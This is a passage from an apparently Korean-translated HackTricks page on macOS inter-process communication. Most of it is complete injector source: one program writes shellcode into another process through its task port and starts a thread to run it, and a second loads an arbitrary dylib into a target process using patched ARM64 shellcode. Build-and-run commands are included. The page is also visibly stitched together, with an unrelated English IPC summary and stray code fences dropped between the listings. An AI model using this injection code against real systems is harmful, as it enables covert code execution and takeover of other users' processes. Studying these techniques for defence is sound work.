int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### 태스크 포트를 통한 스레드 내 Dylib 삽입

macOS에서 **스레드**는 **Mach**를 통해 조작되거나 **posix `pthread` api**를 사용하여 조작될 수 있습니다. 이전 삽입에서 생성된 스레드는 Mach api를 사용하여 생성되었기 때문에 **posix 호환성이 없습니다**.

**간단한 쉘코드를 삽입**하여 명령을 실행하는 것이 가능했던 이유는 **posix 호환성이 필요하지 않았기 때문**이며, Mach와만 작동해도 충분했습니다. **더 복잡한 삽입**을 위해서는 **스레드**가 **posix 호환**되어야 합니다.

따라서 **스레드를 개선**하기 위해 **`pthread_create_from_mach_thread`**를 호출하여 **유효한 pthread를 생성**해야 합니다. 그런 다음, 이 새로운 pthread는 **시스템에서 dylib를 로드**하기 위해 **dlopen을 호출**할 수 있으므로 다른 작업을 수행하기 위해 새로운 쉘코드를 작성하는 대신 사용자 정의 라이브러리를 로드할 수 있습니다.

예를 들어 **로그를 생성하고 해당 로그를 수신할 수 있는 라이브러리**가 있는 (예:):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"원격 스레드의 코드에 대한 메모리 권한 설정 실패: 오류 %s\n", mach_error_string(kr));
return (-4);
}

// 할당된 스택 메모리의 권한 설정
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"원격 스레드의 스택에 대한 메모리 권한 설정 실패: 오류 %s\n", mach_error_string(kr));
return (-4);
}


// 쉘코드를 실행할 스레드 생성
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // 실제 스택
//remoteStack64 -= 8;  // 16의 배수 정렬 필요

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("원격 스택 64  0x%llx, 원격 코드는 %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"원격 스레드 생성 실패: 오류 %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "사용법: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: 디스크에 있는 dylib 경로\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib를 찾을 수 없음\n");
}

}
```
</details>  

<details>
<summary>macOS IPC (Inter-Process Communication)</summary>

### macOS IPC (Inter-Process Communication)

Inter-process communication (IPC) is a set of methods for the exchange of data among multiple threads in one or more processes. macOS provides several IPC mechanisms that can be abused by attackers to escalate privileges or perform other malicious activities. Understanding how IPC works on macOS is crucial for both offensive and defensive security research.

#### Types of macOS IPC

1. **Mach Messages**: Low-level messaging system used by macOS for inter-process communication.
2. **XPC**: Apple's high-level inter-process communication technology used for communication between processes.
3. **Distributed Objects**: Apple's legacy inter-process communication technology that allows objects to be used by multiple processes.

#### macOS IPC Abuse Techniques

1. **Impersonating XPC Services**: Attacker can impersonate XPC services to gain unauthorized access to sensitive functionalities.
2. **Mach Message Injection**: Attacker can inject malicious Mach messages to manipulate target processes.
3. **Distributed Objects Abuse**: Attacker can abuse Distributed Objects to perform privilege escalation or gain unauthorized access.

By understanding the intricacies of macOS IPC mechanisms, security researchers can discover and mitigate potential security vulnerabilities effectively.
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### 태스크 포트를 통한 스레드 하이재킹 <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

이 기술에서는 프로세스의 스레드가 하이재킹됩니다:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### 기본 정보

XPC는 macOS 및 iOS에서 **프로세스 간 통신**을 위한 프레임워크인 XNU( macOS에서 사용되는 커널) Inter-Process Communication의 약자입니다. XPC는 시스템 내에서 **다른 프로세스 간에 안전하고 비동기적인 메소드 호출을 가능하게 하는 메커니즘**을 제공합니다. 이는 Apple의 보안 패러다임의 일부로, **권한이 분리된 응용 프로그램을 생성**할 수 있게 하며, 각 **구성 요소**가 **필요한 권한만 가지고** 작업을 수행하도록 함으로써, 침해된 프로세스로부터의 잠재적인 피해를 제한합니다.

이 **통신이 작동하는 방식** 및 **취약할 수 있는 방법**에 대한 자세한 정보는 확인하세요:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG는 Mach IPC의 프로세스를 **간단화하는 데 사용되는 코드 생성을 간소화**하기 위해 만들어졌습니다. 기본적으로 주어진 정의로 서버와 클라이언트가 통신할 수 있도록 **필요한 코드를 생성**합니다. 생성된 코드가 어색해도, 개발자는 그것을 가져와서 그 코드가 이전보다 훨씬 간단해질 것입니다.

자세한 정보는 확인하세요:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## 참고 자료

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 전문가로 배우세요!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 홍보**하거나 **PDF 형식의 HackTricks 다운로드**를 원하시면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
